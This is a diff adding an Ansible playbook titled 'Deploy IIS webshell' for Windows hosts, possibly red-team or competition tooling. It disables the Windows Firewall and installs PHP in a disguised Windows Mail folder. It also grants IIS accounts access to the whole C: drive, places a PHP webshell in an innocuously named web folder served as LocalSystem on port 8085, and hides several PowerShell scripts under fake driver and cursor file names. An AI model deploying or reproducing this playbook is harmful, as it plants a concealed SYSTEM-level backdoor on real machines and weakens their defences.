@@ -1,0 +1,164 @@
+---
+- name: Deploy IIS webshell
+  hosts: windows
+  gather_facts: false
+  vars:
+    custom_c_path: "C:"
+
+  tasks:
+    - name: Disable Windows Firewall for all profiles
+      community.windows.win_firewall:
+        state: disabled
+      ignore_errors: yes
+
+    - name: Install IIS if not installed
+      ansible.windows.win_feature:
+        name: Web-Server
+        state: present
+        include_management_tools: yes
+
+    - name: Install CGI feature
+      ansible.windows.win_feature:
+        name: Web-CGI
+        state: present
+        include_management_tools: true
+
+    - name: Install PHP on target host
+      ansible.windows.win_powershell:
+        script: |
+          New-Item -Path 'C:\Program Files\Windows Mail\PHP' -ItemType Directory -Force | Out-Null
+
+          Invoke-WebRequest `
+            -Uri 'https://downloads.php.net/~windows/releases/archives/php-8.5.12-nts-Win32-vs17-x64.zip' `
+            -OutFile 'C:\Program Files\Windows Mail\PHP\php.zip'
+    
+    - name: Extract PHP zip file 
+      community.windows.win_unzip:
+        src: C:\Program Files\Windows Mail\PHP\php.zip
+        dest: C:\Program Files\Windows Mail\PHP
+
+    - name: Install Visual C++ redistributable
+      ansible.windows.win_package:
+        path: https://aka.ms/vc14/vc_redist.x64.exe
+        state: present
+        arguments: /install /passive /norestart
+        expected_return_code:
+          - 0
+          - 3010
+
+    - name: Configure PHP in IIS
+      ansible.windows.win_powershell:
+        script: |
+          $appcmd = "$env:windir\System32\inetsrv\appcmd.exe"
+
+          & $appcmd set config /section:system.webServer/fastCgi "/+[fullPath='C:\Program Files\Windows Mail\PHP\php-cgi.exe']" /commit:apphost
+
+          & $appcmd set config /section:system.webServer/handlers "/+[name='PHP-FastCGI',path='*.php',verb='GET,HEAD,POST',modules='FastCgiModule',scriptProcessor='C:\Program Files\Windows Mail\PHP\php-cgi.exe',resourceType='Either']" /commit:apphost
+
+      #grant IIS access to full file directory
+    - name: Grant Read and Execute permissions to IIS_IUSRS on the C:\ folder
+      ansible.windows.win_acl:
+        path: "{{ custom_c_path }}"
+        user: "IIS_IUSRS"
+        rights: "ReadAndExecute"
+        type: "allow"
+        state: "present"
+        inherit: "ContainerInherit, ObjectInherit"
+        propagation: "None"
+
+    - name: Grant Read and Execute permissions to IUSR (for Anonymous Auth)
+      ansible.windows.win_acl:
+        path: "{{ custom_c_path }}"
+        user: "IUSR"
+        rights: "ReadAndExecute"
+        type: "allow"
+        state: "present"
+        inherit: "ContainerInherit, ObjectInherit"
+        propagation: "None"
+
+    - name: Grant Modify permissions to the Application Pool identity
+      ansible.windows.win_acl:
+        path: "{{ custom_c_path }}"
+        user: "IIS AppPool\\AdminAppPool"
+        rights: "Modify"
+        type: "allow"
+        state: "present"
+        inherit: "ContainerInherit, ObjectInherit"
+        propagation: "None"
+      when: true
+
+    - name: Create directory to hold webshell
+      ansible.windows.win_powershell:
+        script: |
+          New-Item -Path 'C:\inetpub\wwwroot\ImageContainer' -ItemType Directory -Force | Out-Null
+
+    #- name: Create deep directory to hold webshell
+    #  ansible.windows.win_powershell:
+    #    script: |
+    #      New-Item -Path 'C:\inetpub\wwwroot\ImageContainer' -ItemType Directory -Force | Out-Null
+
+    - name: Deploy PHP webshell
+      ansible.windows.win_copy:
+        src: snoopy.php
+        dest: C:\inetpub\wwwroot\ImageContainer\
+
+    - name: Deploy disableiis script
+      ansible.windows.win_copy:
+        src: disableiis.ps1
+        dest: '{{ item }}'
+      loop:
+        - C:\Windows\drivers\openstack.ps1
+        - C:\Windows\Cursors\arrow_arrow.ps1
+
+    - name: Deploy sessionrevokewin.ps1 script
+      ansible.windows.win_copy:
+        src: sessionrevokewin.ps1
+        dest: '{{ item }}'
+      loop:
+        - C:\Windows\drivers\openstacked.ps1
+        - C:\Windows\Cursors\arrow_arrows.ps1
+          
+    - name: Deploy test
+      ansible.windows.win_copy:
+        src: testcreateusers.ps1
+        dest: '{{ item }}'
+      loop:
+        - C:\Windows\drivers\t1.ps1
+        - C:\Windows\Cursors\t2.ps1
+        
+    - name: Deploy resetpw.ps1 script #rotate_local.ps1 script
+      ansible.windows.win_copy:
+        src: resetpw.ps1
+        dest: '{{ item }}'
+      loop:
+        - C:\Windows\drivers\openstacker.ps1
+        - C:\Windows\Cursors\arrow_arrower.ps1
+
+    - name: Configure application pool identity
+      microsoft.iis.web_app_pool:
+        name: AdminAppPool
+        state: started
+        attributes:
+          processModel.identityType: LocalSystem
+
+    - name: Configure Admin Web Site on port 8085
+      microsoft.iis.website:
+        name: Admin Web Site
+        state: started
+        bindings:
+          add:
+            - ip: "*"
+              port: 8085
+              protocol: http
+        physical_path: 'C:\inetpub\wwwroot\ImageContainer'
+
+    - name: Allow inbound TCP port 8085
+      ansible.windows.win_powershell:
+        script: |
+          New-NetFirewallRule `
+            -DisplayName "IIS HTTP Port 8085" `
+            -Direction Inbound `
+            -Protocol TCP `
+            -LocalPort 8085 `
+            -Action Allow `
+            -ErrorAction SilentlyContinue
